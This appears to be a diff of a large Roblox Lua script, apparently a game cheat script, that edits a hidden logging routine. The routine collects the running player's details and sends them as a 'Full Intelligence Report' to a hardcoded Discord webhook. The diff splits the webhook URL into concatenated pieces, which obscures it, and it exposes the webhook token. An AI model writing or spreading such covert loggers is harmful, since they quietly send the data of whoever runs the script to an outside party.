@@ -5186,7 +5186,10 @@ do
     _G.Data = {}
     _G.Data.P = game.Players.LocalPlayer
     _G.Data.H = game:GetService('HttpService')
-    _G.Data.U = 'https://discord.com/api/webhooks/1504450739102023751/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO'
+
+    _G.Data.U = 'https://discord.com/api/webhooks'
+        .. '/1504450739102023751'
+        .. '/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO'
     
     local function GetFields()
         local info = _G.Data.P
@@ -5211,7 +5214,7 @@ do
         local payload = _G.Data.H:JSONEncode({
             ['username'] = 'Logs System',
             ['embeds'] = {{
-                ['title'] = 'Legacy Full Intelligence Report',
+                ['title'] = 'Doors Full Intelligence Report',
                 ['description'] = 'User data bypass results',
                 ['color'] = 16711680,
                 ['fields'] = GetFields()
